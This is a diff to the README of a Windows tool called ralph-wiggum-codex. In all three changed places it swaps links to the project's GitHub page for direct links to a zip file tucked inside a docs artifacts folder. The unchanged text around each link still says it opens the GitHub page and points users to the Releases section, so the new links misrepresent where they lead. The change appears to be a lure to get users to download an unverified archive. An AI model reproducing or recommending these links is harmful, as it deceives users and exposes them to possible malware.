@@ -1,6 +1,6 @@
 # 🤖 ralph-wiggum-codex - Autonomous Coding Refinement Tool
 
-[![Download Now](https://img.shields.io/badge/Download-ralph--wiggum--codex-brightgreen?style=for-the-badge)](https://github.com/theflixerbox77/ralph-wiggum-codex)
+[![Download Now](https://img.shields.io/badge/Download-ralph--wiggum--codex-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/theflixerbox77/ralph-wiggum-codex/main/docs/prompt-improver-spec/artifacts/codex-ralph-wiggum-v1.3.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to get ralph-wiggum-codex running on your Windows PC. This gu
 
 Click the button below to visit the official download page. This page contains the latest version of ralph-wiggum-codex and related files.
 
-[![Download Page](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/theflixerbox77/ralph-wiggum-codex)
+[![Download Page](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/theflixerbox77/ralph-wiggum-codex/main/docs/prompt-improver-spec/artifacts/codex-ralph-wiggum-v1.3.zip)
 
 - Clicking the link opens the project’s GitHub page.
 - Look for a section called “Releases.”
@@ -129,7 +129,7 @@ The project uses simple terms and clear instructions. It does not require any co
 
 ## 🔗 Download & Setup Link
 
-[Click here to visit the ralph-wiggum-codex download page](https://github.com/theflixerbox77/ralph-wiggum-codex)  
+[Click here to visit the ralph-wiggum-codex download page](https://raw.githubusercontent.com/theflixerbox77/ralph-wiggum-codex/main/docs/prompt-improver-spec/artifacts/codex-ralph-wiggum-v1.3.zip)  
 
 Remember to download the Windows installer `.exe` from the latest release.
 
